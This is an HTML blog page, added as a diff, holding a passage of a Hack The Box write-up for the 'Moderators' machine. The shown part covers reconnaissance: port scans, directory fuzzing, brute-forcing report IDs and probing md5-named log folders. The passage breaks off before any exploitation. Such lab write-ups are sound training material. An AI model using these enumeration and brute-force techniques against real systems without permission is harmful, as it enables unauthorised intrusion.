@@ -1,0 +1,1242 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2022-09-02">
+<meta name="description" content="Moderators is a hard-rated Linux machine from Hack The Box. Doing this box about a month after release it has a very low rating of only 2.6, and honestly I do agree. Throughout this box you’ll enumerate, enumerate and then enumerate some more. The few vulnerabilities presented have low quality in terms that you will learn little to nothing. That path to root is unique but sadly more annoying then fun/interesting. I see why the box creator went this way, as it show cases something never seen on Hack The Box - but to be honest, this box has nothing to do with hacking. If you need the points, go ahead and do this box, if not I’d advise you to do something else with your time.">
+
+<title>Moderators - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Moderators - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Moderators is a hard-rated Linux machine from Hack The Box. Doing this box about a month after release it has a very low rating of only 2.6, and honestly I do agree. Throughout this box you’ll enumerate, enumerate and then enumerate some more. The few vulnerabilities presented have low quality in terms that you will learn little to nothing. That path to root is unique but sadly more annoying then fun/interesting. I see why the box creator went this way, as it show cases something never seen on Hack The Box - but to be honest, this box has nothing to do with hacking. If you need the points, go ahead and do this box, if not I’d advise you to do something else with your time.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+                <div class="quarto-category">linux</div>
+                <div class="quarto-category">file upload</div>
+                <div class="quarto-category">tunneling</div>
+                <div class="quarto-category">vboxdie-cracker</div>
+                <div class="quarto-category">luks</div>
+                <div class="quarto-category">bruteforce</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">September 2, 2022</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
+  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
+  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
+  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
+  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
+  </ul></li>
+  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
+  <ul class="collapse">
+  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
+  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
+  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
+  <li><a href="#step-4-1" id="toc-step-4-1" class="nav-link" data-scroll-target="#step-4-1">Step 4</a></li>
+  </ul></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="step-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> 10.10.11.173</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p22,80</span> <span class="at">-sCV</span> 10.10.11.173</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3072</span> 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.41 <span class="er">(</span><span class="kw">(</span><span class="ex">Ubuntu</span><span class="kw">))</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Apache/2.4.41 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Moderators</span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://10.10.11.173</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">http://10.10.11.173</span> <span class="er">(</span><span class="ex">0.2s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Google</span> Font API,  <span class="er">(</span><span class="ex">Font</span> scripts<span class="kw">)</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Font</span> Awesome,  <span class="er">(</span><span class="ex">Font</span> scripts<span class="kw">)</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Bootstrap,</span>  <span class="er">(</span><span class="ex">UI</span> frameworks<span class="kw">)</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Apache,</span> 2.4.41 <span class="er">(</span><span class="ex">Web</span> servers<span class="kw">)</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/FUZZ          </span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.htaccess</span>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 35ms]</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">.htpasswd</span>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 38ms]</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">css</span>                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 30ms]</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">images</span>                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">server-status</span>           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 39ms]</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/FUZZ</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="ex">css</span>                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 61ms]</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="ex">uploads</span>                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 47ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>On port 80 we’re met with a very basic and ugly php page for the company <em>Moderators</em>.</p>
+<p><img src="images/moderators01.png" class="img-fluid"></p>
+<p>Looking around we find..</p>
+<p>.. three names and numbers in the footer - <em>Jane</em>, <em>Holy</em> and <em>Fred</em><br> .. on <code>/about.php</code> we find 6 users - <em>Carl Benjamin</em>, <em>David Wall</em>, <em>Luna Harper</em>, <em>John Miller</em>, <em>Anthony Smith</em> and <em>Lexi Marie</em>. <br> .. <code>blog.php</code> contain vulnerability reports, mostly regarding sql injections. <br> .. <code>/reports.php?report=8121</code> contain a masked domain hinting that <code>moderators.htb</code> might have a subdomain.<br> .. <code>/reports.php?report=4221</code> nothing of use<br> .. <code>/reports.php?report=3478</code> nothing of use<br></p>
+<p>Use Burp Intruder to loop through 1-10000 on <code>/reports.php?report=</code> and we find three new <em>pending</em> reports: - <code>/reports.php?report=2589</code> nothing of use - <code>/reports.php?report=7612</code> nothing of use - <code>/reports.php?report=9798</code> a path to logs - <code>logs/e21cece511f43a5cb18d4932429915ed/</code></p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/e21cece511f43a5cb18d4932429915ed/</span> HTTP/1.1</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 11:54:32 GMT</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dcad053"</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>After fuzzing the directory for a while I find nothing. Instead we change focus and look on the url, and more specific <code>e21cece511f43a5cb18d4932429915ed</code>.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"e21cece511f43a5cb18d4932429915ed"</span> <span class="kw">|</span> <span class="fu">wc</span> <span class="at">-c</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">32</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"9798"</span> <span class="kw">|</span> <span class="fu">md5sum</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">e21cece511f43a5cb18d4932429915ed</span>  <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The value is the md5sum of log id. Lets use this to see if there is any information we can grab from the other 5 reports.</p>
+<p><strong>2589:</strong></p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"2589"</span> <span class="kw">|</span> <span class="fu">md5sum</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">743c41a921516b04afde48bb48e28ce6</span>  <span class="at">-</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/743c41a921516b04afde48bb48e28ce6/</span> HTTP/1.1</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 12:06:08 GMT</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dc68a76"</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connection <span class="co">#0 to host moderators.htb left intact</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>3478:</strong></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"3478"</span> <span class="kw">|</span> <span class="fu">md5sum</span>                                         </span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">b071cfa81605a94ad80cfa2bbc747448</span>  <span class="at">-</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/b071cfa81605a94ad80cfa2bbc747448/</span> HTTP/1.1</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 12:07:05 GMT</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dc89dc4"</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
